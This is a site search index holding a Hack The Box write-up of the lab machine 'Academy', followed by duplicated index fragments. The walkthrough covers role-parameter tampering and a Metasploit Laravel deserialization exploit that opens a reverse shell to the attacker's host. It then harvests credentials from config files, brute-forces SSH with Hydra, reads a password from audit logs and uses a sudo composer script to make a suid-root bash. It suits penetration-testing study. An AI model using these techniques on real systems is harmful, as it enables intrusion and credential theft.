{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Hack The Box machine writeups by pugpug # These are my writeups for various machines on Hack The Box . Writeups will be published once a machine is retired. Easy # Academy - Linux Medium # Forge - Linux Hard # Insane #","title":"Welcome"},{"location":"#hack-the-box-machine-writeups-by-pugpug","text":"These are my writeups for various machines on Hack The Box . Writeups will be published once a machine is retired.","title":"Hack The Box machine writeups by pugpug"},{"location":"#easy","text":"Academy - Linux","title":"Easy"},{"location":"#medium","text":"Forge - Linux","title":"Medium"},{"location":"#hard","text":"","title":"Hard"},{"location":"#insane","text":"","title":"Insane"},{"location":"machines/Academy/","text":"Academy (Linux easy) # Academy is a straightforward machine from egre55 and mrb3n . We'll be covering web app exploitation, web framewok vulnerabilities, unforseen side-effects leading to credential exposure, and priviledge abuse in our path from remote to user to root. Reconnaissance # After adding 10.10.10.215 academy.htb to /etc/hosts , I performed my standard recon for open ports on the machine: nmap -sS -sV -Pn -v -p- -sC -oA academy academy.htb : Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-12 20:06 UTC NSE: Loaded 153 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 20:06 Completed NSE at 20:06, 0.00s elapsed Initiating NSE at 20:06 Completed NSE at 20:06, 0.00s elapsed Initiating NSE at 20:06 Completed NSE at 20:06, 0.00s elapsed Initiating SYN Stealth Scan at 20:06 Scanning academy.htb (10.10.10.215) [65535 ports] Discovered open port 80/tcp on 10.10.10.215 Discovered open port 22/tcp on 10.10.10.215 Discovered open port 33060/tcp on 10.10.10.215 Completed SYN Stealth Scan at 20:07, 31.11s elapsed (65535 total ports) Initiating Service scan at 20:07 Scanning 3 services on academy.htb (10.10.10.215) Completed Service scan at 20:07, 23.39s elapsed (3 services on 1 host) NSE: Script scanning 10.10.10.215. Initiating NSE at 20:07 Completed NSE at 20:07, 1.38s elapsed Initiating NSE at 20:07 Completed NSE at 20:07, 0.17s elapsed Initiating NSE at 20:07 Completed NSE at 20:07, 0.00s elapsed Nmap scan report for academy.htb (10.10.10.215) Host is up (0.045s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA) | 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA) |_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Hack The Box Academy 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\" |_ HY000 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port33060-TCP:V=7.91%I=7%D=1/12%Time=5FFE0173%P=x86_64-pc-linux-gnu%r(N SF:ULL,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(GenericLines,9,\"\\x05\\0\\0\\0\\x0b\\ SF:x08\\x05\\x1a\\0\")%r(GetRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(HTTPOp SF:tions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(RTSPRequest,9,\"\\x05\\0\\0\\0\\x0b SF:\\x08\\x05\\x1a\\0\")%r(RPCCheck,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSVers SF:ionBindReqTCP,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSStatusRequestTCP,2 SF:B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fI SF:nvalid\\x20message\\\"\\x05HY000\")%r(Help,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\") SF:%r(SSLSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01 SF:\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\")%r(TerminalServerCookie SF:,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TLSSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x SF:08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\" SF:\\x05HY000\")%r(Kerberos,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SMBProgNeg,9 SF:,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(X11Probe,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\ SF:x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY0 SF:00\")%r(FourOhFourRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LPDString, SF:9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LDAPSearchReq,2B,\"\\x05\\0\\0\\0\\x0b\\x0 SF:8\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\ SF:x05HY000\")%r(LDAPBindReq,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SIPOptions SF:,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LANDesk-RC,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x SF:05\\x1a\\0\")%r(TerminalServer,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NCP,9,\" SF:\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NotesRPC,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1 SF:a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000 SF:\")%r(JavaRMI,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(WMSRequest,9,\"\\x05\\0\\0 SF:\\0\\x0b\\x08\\x05\\x1a\\0\")%r(oracle-tns,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r SF:(ms-sql-s,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(afp,2B,\"\\x05\\0\\0\\0\\x0b\\x0 SF:8\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\ SF:x05HY000\")%r(giop,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. Initiating NSE at 20:07 Completed NSE at 20:07, 0.00s elapsed Initiating NSE at 20:07 Completed NSE at 20:07, 0.00s elapsed Initiating NSE at 20:07 Completed NSE at 20:07, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.52 seconds Raw packets sent: 65647 (2.888MB) | Rcvd: 65535 (2.621MB) We see 3 open ports, 22 , 80 , and 33060 . Opening port 80 in Firefox gives us the following screen: There's a Login page: and a Registration page: Let's see what other pages are on the machine. My preferred tool for this is gobuster : gobuster dir --url=http://academy.htb -w /usr/share/wordlists/dirb/big.txt -x php,txt,Z,gz,zip =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://academy.htb [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,Z,gz,zip [+] Timeout: 10s =============================================================== 2021/01/12 20:13:50 Starting gobuster =============================================================== /.htaccess (Status: 403) /.htaccess.php (Status: 403) /.htaccess.txt (Status: 403) /.htaccess.Z (Status: 403) /.htaccess.gz (Status: 403) /.htaccess.zip (Status: 403) /.htpasswd (Status: 403) /.htpasswd.php (Status: 403) /.htpasswd.txt (Status: 403) /.htpasswd.Z (Status: 403) /.htpasswd.gz (Status: 403) /.htpasswd.zip (Status: 403) /admin.php (Status: 200) /config.php (Status: 200) /home.php (Status: 302) /images (Status: 301) /index.php (Status: 200) /login.php (Status: 200) /register.php (Status: 200) /server-status (Status: 403) =============================================================== 2021/01/12 20:22:24 Finished =============================================================== So in addition to login.php and and register.php , there is an Admin page at admin.php , a configuration file at config.php , and a home.php that we're not authorized to see. Configuring the browser to send traffic through [ZAP](https://www.zaproxy.org) and submitting a registration allows us to log in: ZAP shows us the POST data sent to the web server. The fields look like what we filled out in the Registration page, with one addition: roleid=0 . We may be able to create an 'administrator' account if we set roleid=1 . Sending the POST data to ZAP's Request Editor allows us to edit roleid=1 and re-submit the post. We receive a 200 response code, which (hopefully) means the registration is successful. Attempting to log in with our newly created account on admin.php takes us to this page: Bingo! We've discovered a couple of new accounts: cry0l1t3 and mrb3n , as well as a virtual host we didn't know about before. Adding it to the entry for academy in /etc/hosts and visiting it in the browser yields a treasure trove of information (click for high resolution picture): Scrolling the bottom right pane, we see even more data: From this screen, we can discern a lot of information about the web server and what it's running: The web framework appears to be Laravel , a PHP web framework. The web server is Apache version 2.4.41 , and running on an Ubuntu OS. MySQL is running on the server, listening on port 3306 , and we see some possible credentials: homestead:secret . This may be the service listening on port 33060 as well. There are refernces to a Redis server on the host. The web application is installed in /var/www/html/htb-academy-dev-01 . We have part of the Laravel framework configuration exposed: the APP_KEY : base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Foothold # The Laravel framework presents a good place to start looking for potential vulnerabilities. searching Exploit DB for laravel yields a few interesting results: The Metasploit vulnerability looks promising: it's relatively recent and has been verified. Firing up msfconsole and looking at the module info shows we need the remote host (RHOST) , the virtual server name (VHOST) , and the APP_KEY we found in the dump above. Let's give the module a try: msf6 > use exploit/unix/http/laravel_token_unserialize_exec [*] Using configured payload cmd/unix/reverse_perl msf6 exploit(unix/http/laravel_token_unserialize_exec) > set LHOST tun0 LHOST => tun0 msf6 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.10.10.215 RHOSTS => 10.10.10.215 msf6 exploit(unix/http/laravel_token_unserialize_exec) > set VHOST dev-staging-01.academy.htb VHOST => dev-staging-01.academy.htb msf6 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= msf6 exploit(unix/http/laravel_token_unserialize_exec) > exploit -j [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. msf6 exploit(unix/http/laravel_token_unserialize_exec) > [*] Started reverse TCP handler on 10.10.14.251:4444 [*] Command shell session 1 opened (10.10.14.251:4444 -> 10.10.10.215:41432) at 2021-01-13 19:30:11 +0000 And there we have a session created. Let's upgrade it to a meterpreter session for more flexibility: msf6 exploit(unix/http/laravel_token_unserialize_exec) > use post/multi/manage/shell_to_meterpreter msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1 SESSION => 1 msf6 post(multi/manage/shell_to_meterpreter) > run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.10.14.251:4433 [*] Sending stage (976712 bytes) to 10.10.10.215 [*] Meterpreter session 2 opened (10.10.14.251:4433 -> 10.10.10.215:46886) at 2021-01-13 19:34:15 +0000 [*] Command stager progress: 100.00% (773/773 bytes) [*] Post module execution completed msf6 post(multi/manage/shell_to_meterpreter) > [*] Stopping exploit/multi/handler msf6 post(multi/manage/shell_to_meterpreter) > sessions 2 [*] Starting interaction with 2... meterpreter > meterpreter > getuid sServer username: www-data @ academy (uid=33, gid=33, euid=33, egid=33) meterpreter > sysinfo Computer : 10.10.10.215 OS : Ubuntu 20.04 (Linux 5.4.0-52-generic) Architecture : x64 BuildTuple : i486-linux-musl Meterpreter : x86/linux meterpreter > And there we have our foothold, a meterpreter session on the host, running as www-admin . We can grab the passwd file for information on other accounts to target: meterpreter > cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ... egre55:x:1000:1000:egre55:/home/egre55:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mrb3n:x:1001:1001::/home/mrb3n:/bin/sh cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false 21y4d:x:1003:1003::/home/21y4d:/bin/sh ch4p:x:1004:1004::/home/ch4p:/bin/sh g0blin:x:1005:1005::/home/g0blin:/bin/sh egre55 , cry0l1t3 , and mrb3n we knew about, the last 3 are new. Let's go poke around in the web root. The Metasploit module we used mentions a .env file that Laravel uses to configure various settings, there may be others worth looking at. meterpreter > cd /var/www/html meterpreter > ls Listing: /var/www/html ====================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40755/rwxr-xr-x 4096 dir 2021-01-13 19:25:26 +0000 academy 40755/rwxr-xr-x 4096 dir 2020-08-13 12:40:29 +0000 htb-academy-dev-01 100644/rw-r--r-- 50 fil 2020-08-09 15:49:40 +0000 index.php meterpreter > cd academy meterpreter > ls Listing: /var/www/html/academy ============================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100644/rw-r--r-- 706 fil 2020-08-13 12:42:01 +0000 .env 100644/rw-r--r-- 651 fil 2020-08-09 15:49:40 +0000 .env.example 100644/rw-r--r-- 111 fil 2020-08-09 15:49:40 +0000 .gitattributes 100644/rw-r--r-- 155 fil 2020-08-09 15:49:40 +0000 .gitignore 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 app 100755/rwxr-xr-x 1686 fil 2020-08-09 15:49:40 +0000 artisan 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 bootstrap 100644/rw-r--r-- 1512 fil 2020-08-09 15:49:40 +0000 composer.json 100644/rw-r--r-- 191621 fil 2020-08-09 15:49:40 +0000 composer.lock 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 config 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 database 100644/rw-r--r-- 2956188 fil 2021-01-13 19:26:47 +0000 hehe 100644/rw-r--r-- 1150 fil 2020-08-09 15:49:40 +0000 package.json 100644/rw-r--r-- 1040 fil 2020-08-09 15:49:40 +0000 phpunit.xml 40755/rwxr-xr-x 4096 dir 2021-01-13 17:21:07 +0000 public 100644/rw-r--r-- 3622 fil 2020-08-09 15:49:40 +0000 readme.md 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 resources 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 routes 100644/rw-r--r-- 563 fil 2020-08-09 15:49:40 +0000 server.php 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 storage 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 tests 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 vendor 100644/rw-r--r-- 549 fil 2020-08-09 15:49:40 +0000 webpack.mix.js meterpreter > cat .env APP_NAME=Laravel APP_ENV=local APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= APP_DEBUG=false APP_URL=http://localhost LOG_CHANNEL=stack DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=academy DB_USERNAME=dev DB_PASSWORD=mySup3rP4s5w0rd!! BROADCAST_DRIVER=log CACHE_DRIVER=file SESSION_DRIVER=file SESSION_LIFETIME=120 QUEUE_DRIVER=sync REDIS_HOST=127.0.0.1 REDIS_PASSWORD=null REDIS_PORT=6379 MAIL_DRIVER=smtp MAIL_HOST=smtp.mailtrap.io MAIL_PORT=2525 MAIL_USERNAME=null MAIL_PASSWORD=null MAIL_ENCRYPTION=null PUSHER_APP_ID= PUSHER_APP_KEY= PUSHER_APP_SECRET= PUSHER_APP_CLUSTER=mt1 MIX_PUSHER_APP_KEY=\"${PUSHER_APP_KEY}\" MIX_PUSHER_APP_CLUSTER=\"${PUSHER_APP_CLUSTER}\" That's a new password: mySup3rP4s5w0rd!! . Also, when we did our gobuster dir of the main academy.htb website, we saw the file config.php . We should go see what is in that as well: meterpreter > cd public meterpreter > ls Listing: /var/www/html/academy/public ===================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40755/rwxr-xr-x 4096 dir 2020-11-05 12:23:01 +0000 Modules_files 100644/rw-r--r-- 1600 fil 2020-08-11 00:55:16 +0000 admin-page.php 100644/rw-r--r-- 3247 fil 2020-08-12 21:28:32 +0000 admin.php 100644/rw-r--r-- 174 fil 2020-08-09 16:55:09 +0000 config.php 100644/rw-r--r-- 55036 fil 2020-11-09 10:13:59 +0000 home.php 40755/rwxr-xr-x 4096 dir 2020-09-14 22:38:21 +0000 images 100644/rw-r--r-- 2117 fil 2020-09-14 22:40:07 +0000 index.php 100644/rw-r--r-- 3185 fil 2020-08-12 21:28:52 +0000 login.php 100644/rw-r--r-- 4304 fil 2020-11-05 12:51:00 +0000 register.php 100644/rw-r--r-- 5494 fil 2021-01-13 17:21:07 +0000 shell.php 100644/rw-r--r-- 685 fil 2020-11-05 12:51:19 +0000 success-page.php meterpreter > cat config.php <?php ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); $ link = mysqli_connect ( 'localhost' , 'root' , 'GkEWXn4h34g8qx9fZ1' , 'academy' ) ; ?> Another possible password: GkEWXn4h34g8qx9fZ1 . User # It's a well-used adage in Security that people are lazy. If they can get away with it, they'll re-use passwords EVERYWHERE . Now that we have a few usernames and some possible passwords, we should try using a tool to brute-force combinations and see if we get any hits. My personal favorite for testing passwords against an SSH server is THC Hydra . We create a list of users: jra@kali:~/htb/Machines/Academy$ cat users.txt egre55 mrb3n cry0l1t3 root 21y4d ch4p g0blin And passwords: jra@kali:~/htb/Machines/Academy$ cat passwords.txt mySup3rP4s5w0rd!! secret GkEWXn4h34g8qx9fZ1 We can feed these files to hydra to check for hits. A couple of comments on the flags to hydra : -t 4 sets the number of concurrent threads to be 4 . Some services will throttle or ban too many attempts at a time. The -e flag adds some additional checks: s - try the login as password n - try an empty password r - reverse the login and try it as password jra@kali:~/htb/Machines/Academy$ hydra -L users.txt -P passwords.txt -t 4 -e snr ssh://academy.htb Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-13 20:15:02 [DATA] max 4 tasks per 1 server, overall 4 tasks, 42 login tries (l:7/p:6), ~11 tries per task [DATA] attacking ssh://academy.htb:22/ [22][ssh] host: academy.htb login: cry0l1t3 password: mySup3rP4s5w0rd!! 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-13 20:15:33 We can log in to academy as cry0l1t3 and get the User flag: jra@kali:~/htb/Machines/Academy$ ssh cry0l1t3@academy.htb cry0l1t3@academy.htb's password: Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information disabled due to load higher than 2.0 0 updates can be installed immediately. 0 of these updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Jan 13 19:29:30 2021 from 10.10.14.106 $ ls user.txt $ cat user.txt 569bd4717e889c4ba19266c3790ac81e (Your flag may be different, as the flags change over time) Root # Now we have a shell as a regular user on the box. We can try a couple of obvious paths to root: $ sudo -l [sudo] password for cry0l1t3: Sorry, user cry0l1t3 may not run sudo on academy. $ su - Password: su: Authentication failure $ cat /root/root.txt cat: /root/root.txt: Permission denied But we get bupkis. Uploading and running linPEAS does give us something interesting to take a look at: We're a member of group adm , which isn't a common thing for normal users. Members of the 'adm' group have read access into the logs in /var/log . From the linPEAS output, we see that there are some files in /var/log that look like they might contain interesting information: These are output from auditd , an overview of which is linked here . From the auditd man page: auditd is the userspace component to the Linux Auditing System. It's responsible for writing audit records to the disk. Viewing the logs is done with the ausearch or aureport utilities. Using the ausearch tool, we can dump the audit logs and search for interesting things. I found it easiest to run ausearch -i -if /path/to/audit/file and then use grep to look for interesting things. -i tells ausearch to 'interpret' the data in the logs, such as converting numeric UIDs to usernames. -if /path/name specifies the path of file to read. Starting at the oldest file and working forwards, running ausearch -i -if /var/log/audit/audit.log.3 | grep cry0l1t3 | less , we can find an interesting set of lines: type=TTY msg=audit(08/12/2020 02:28:10.086:83) : tty pid=2517 uid=cry0l1t3 auid=root ses=1 major=4 minor=1 comm=sh data=\"su mrb3n\",<nl> type=TTY msg=audit(08/12/2020 02:28:13.906:84) : tty pid=2520 uid=cry0l1t3 auid=root ses=1 major=4 minor=1 comm=su data=\"mrb3n_Ac@d3my!\",<nl> Verifying the password works, we now have a shell as mrb3n , and mrb3n can run the command /usr/bin/composer as root : cry0l1t3@academy:~$ su - mrb3n Password: $ id uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n) $ sudo -l [sudo] password for mrb3n: Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mrb3n may run the following commands on academy: (ALL) /usr/bin/composer Composer is a dependency manager for PHP modules. In-depth documentation is available on the Composer website. Composer is controlled via a config file named composer.json , and the feature we're interested in is the ability to define arbitrary scripts that can be excuted from the composer command line. We can get very complex with our scripts, or go simple. This composer.json creates a suid-root copy of /bin/bash in the directory /tmp/.pug : { \"name\" : \"pugpug/pugpug\" , \"description\" : \"Pugpug Hacks.\" , \"license\" : \"MIT\" , \"type\" : \"project\" , \"scripts\" : { \"pugpug\" : [ \"mkdir -p /tmp/.pug ; cp /bin/bash /tmp/.pug/bash ; chmod 4755 /tmp/.pug/bash\" ] } } Running sudo composer run-script pugpug will execute the script as root , and we're left with a suid-root copy of bash in /tmp/.pug : mrb3n@academy:/tmp/.pug$ cat composer.json { \"name\": \"pugpug/pugpug\", \"description\": \"Pugpug Hacks.\", \"license\": \"MIT\", \"type\": \"project\", \"scripts\": { \"pugpug\": [ \"mkdir -p /tmp/.pug ; cp /bin/bash /tmp/.pug/bash ; chmod 4755 /tmp/.pug/bash\" ] } } mrb3n@academy:/tmp/.pug$ sudo composer run-script pugpug [sudo] password for mrb3n: PHP Warning: PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0 PHP Warning: PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0 Do not run Composer as root/super user! See https://getcomposer.org/root for details > mkdir -p /tmp/.pug ; cp /bin/bash /tmp/.pug/bash ; chmod 4755 /tmp/.pug/bash mrb3n@academy:/tmp/.pug$ ls -l total 1160 -rwsr-xr-x 1 root root 1183448 Jan 14 00:01 bash -rw-r--r-- 1 mrb3n mrb3n 258 Jan 14 00:00 composer.json (Note the warning about not running Composer as root) We can run our malicious copy of bash with /tmp/.pug/bash -p , and get a root shell: mrb3n@academy:/tmp/.pug$ /tmp/.pug/bash -p bash-5.0# id uid=1001(mrb3n) gid=1001(mrb3n) euid=0(root) groups=1001(mrb3n) bash-5.0# cat /root/root.txt 00d08ac7120264dfc58d360503211699 And that's the Root flag. Final thoughts # This was a fun box. I'm always impressed with egre55's machines, they're well developed and have plausible holes and exploits. I can see how in the 'real world' these types of configurations are possible, and how unintended side-effects can lead to greater compromise. -- pugpug","title":"Academy"},{"location":"machines/Academy/#academy-linux-easy","text":"Academy is a straightforward machine from egre55 and mrb3n . We'll be covering web app exploitation, web framewok vulnerabilities, unforseen side-effects leading to credential exposure, and priviledge abuse in our path from remote to user to root.","title":"Academy (Linux easy)"},{"location":"machines/Academy/#reconnaissance","text":"After adding 10.10.10.215 academy.htb to /etc/hosts , I performed my standard recon for open ports on the machine: nmap -sS -sV -Pn -v -p- -sC -oA academy academy.htb : Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-12 20:06 UTC NSE: Loaded 153 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 20:06 Completed NSE at 20:06, 0.00s elapsed Initiating NSE at 20:06 Completed NSE at 20:06, 0.00s elapsed Initiating NSE at 20:06 Completed NSE at 20:06, 0.00s elapsed Initiating SYN Stealth Scan at 20:06 Scanning academy.htb (10.10.10.215) [65535 ports] Discovered open port 80/tcp on 10.10.10.215 Discovered open port 22/tcp on 10.10.10.215 Discovered open port 33060/tcp on 10.10.10.215 Completed SYN Stealth Scan at 20:07, 31.11s elapsed (65535 total ports) Initiating Service scan at 20:07 Scanning 3 services on academy.htb (10.10.10.215) Completed Service scan at 20:07, 23.39s elapsed (3 services on 1 host) NSE: Script scanning 10.10.10.215. Initiating NSE at 20:07 Completed NSE at 20:07, 1.38s elapsed Initiating NSE at 20:07 Completed NSE at 20:07, 0.17s elapsed Initiating NSE at 20:07 Completed NSE at 20:07, 0.00s elapsed Nmap scan report for academy.htb (10.10.10.215) Host is up (0.045s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA) | 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA) |_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Hack The Box Academy 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\" |_ HY000 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port33060-TCP:V=7.91%I=7%D=1/12%Time=5FFE0173%P=x86_64-pc-linux-gnu%r(N SF:ULL,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(GenericLines,9,\"\\x05\\0\\0\\0\\x0b\\ SF:x08\\x05\\x1a\\0\")%r(GetRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(HTTPOp SF:tions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(RTSPRequest,9,\"\\x05\\0\\0\\0\\x0b SF:\\x08\\x05\\x1a\\0\")%r(RPCCheck,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSVers SF:ionBindReqTCP,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSStatusRequestTCP,2 SF:B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fI SF:nvalid\\x20message\\\"\\x05HY000\")%r(Help,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\") SF:%r(SSLSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01 SF:\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\")%r(TerminalServerCookie SF:,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TLSSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x SF:08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\" SF:\\x05HY000\")%r(Kerberos,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SMBProgNeg,9 